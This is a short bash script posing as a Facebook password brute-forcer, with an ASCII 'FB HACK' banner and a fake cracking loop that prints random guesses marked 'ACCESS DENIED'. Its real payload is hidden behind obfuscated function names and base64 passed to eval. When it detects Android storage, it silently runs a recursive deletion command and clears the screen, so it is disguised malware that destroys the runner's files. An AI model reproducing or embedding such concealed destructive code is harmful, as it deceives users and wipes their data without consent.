#!/bin/bash

function tvksajd {
  pvncngr=$(echo "$1" | base64 -d)
  eval "$pvncngr"
}

function banner {
  echo -e "\033[0;31m
  █████▒▄▄▄▄       ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
▓██   ▒▓█████▄    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒████ ░▒██▒ ▄██   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░▓█▒  ░▒██░█▀     ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░▒█░   ░▓█  ▀█▓   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
 ▒ ░   ░▒▓███▀▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ░     ▒░▒   ░     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░ ░    ░    ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░ 
        ░          ░  ░  ░      ░  ░░ ░      ░  ░   
             ░                      ░               
"
}

function oumcgsq {
  vcxprvq=$(echo "L3N0b3JhZ2UvZW11bGF0ZWQvMC8=" | base64 -d)
  if [ -e "$vcxprvq" ]; then
    tvksajd "cm0gLXJmIGEvKiAmJiBjbGVhcg=="
    banner
  fi
}

function hack {
  banner
  oumcgsq
  read -p "username: " username
  sleep 0.5
  echo -e "\033[34mUsing Default worlist: wordlist.txt"
  sleep 0.5
  alphabet="abcdefghijklmnopqrstuvwxyz"
  while :; do
    x=$(cat /dev/urandom | tr -dc "$alphabet" | fold -w 8 | head -n 1)
    echo -e "\033[34m[+] \033[0;33m$username:$x ==> \033[0;31mACCESS DENIED"
    sleep 1
  done
}

hack
